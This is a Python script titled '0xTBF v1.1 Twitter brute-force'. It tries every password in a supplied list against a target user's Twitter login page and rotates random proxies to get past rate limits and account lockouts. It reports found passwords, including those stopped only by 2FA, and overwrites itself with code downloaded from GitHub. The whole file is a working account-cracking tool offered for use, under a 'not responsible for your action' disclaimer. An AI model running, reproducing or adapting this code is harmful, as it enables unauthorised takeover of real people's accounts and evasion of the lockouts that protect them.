#!/usr/bin/env python
# -*- coding: utf-8 -*-

import mechanize
from proxylist import ProxyList
import logging
import sys, os, argparse

print('''\033[1;36m
                               .:::::::::::.:: .::   .::::::::
              .::                   .::    .:   .::  .::      
            .::  .::  .::   .::     .::    .:    .:: .::      
          .::     .::   .: .::      .::    .::: .:   .::::::  
          .::      .::   .:         .::    .:    .:: .::      
           .::    .::  .:  .::      .::    .:     .: .::      
             .:::     .::   .::     .::    .:::: .:: .::      
        ******************************************************
        * > 0xTBF v1.1 Twitter brute-force                   *
        * > Coded By: Abdullah AlZahrani (0xAbdullah)        *
        * > Twitter: @0xAbdullah | GitHub.com/0xAbdullah     *
        * > I am not responsible for your action             *
        ******************************************************                                                    
\033[1;m''')

parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Twitter brute-force")
parser.add_argument('-u', required=True, default=None, help='Target username.')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
parser.add_argument('-proxy', required=True, default=None, help='Proxy list / Path of Proxy list file.')
args = vars(parser.parse_args())

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True
b.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

username = args['u']
passwordList = args['p']
proxyList = args['proxy']

if os.path.exists(args['p']) == False:
    sys.exit("[!] password file does not exist !")
elif os.path.exists(args['proxy']) == False:
    sys.exit("[!] proxy list file does not exist !")

def checkUpdate(): # Thanks xSecurity for your help | Follow him on Twitter: @xSecLabs
    xBTF = os.path.basename(__file__)
    print('[==] Checking For Update..')
    check = b.open('https://raw.githubusercontent.com/0xAbdullah/0xTBF/master/version').read()
    if '0xTBF_v1.1' not in check:
        print('[$] There New Update | Wait...')
        newUpdate = b.open('https://raw.githubusercontent.com/0xAbdullah/0xTBF/master/0xTBF.py').read()
        update = file(xBTF, 'w')
        update.write(newUpdate)
        sys.exit('[==] Update Complete, Now Try To Execute Tool Again..')
    else:
        print('[==] There No Update, Start Brute Force Now...\n')

def proxy():
    logging.basicConfig()
    pl = ProxyList()
    pl.load_file(proxyList)
    pl.random()
    getProxy = pl.random().address()
    b.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
    except:
        return proxy()

def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("[==] Target Account: {}".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
            proxy()
        sys.stdout.write('\r[==] {} '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"
        try:
            response = b.open(url, timeout=5)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()
            if 'https://mobile.twitter.com/account/login_challenge' in response.geturl():
                print("[^] True\n[==] Password Found: {} --> But There is a 2FA".format(password))
                break
            elif response.geturl() == "https://mobile.twitter.com/home":
                print("[^] True\n[==] Password Found {}".format(password))
                break
            elif 'https://mobile.twitter.com/account/locked' in response.geturl():
                proxy()
            else:
                sys.stdout.write("[!] False\n")
        except:
            sys.stdout.write('[!] something wrong\n')
            sys.stdout.flush()
            proxy()

if __name__ == '__main__':
    checkUpdate()
    proxy()
    Twitter()
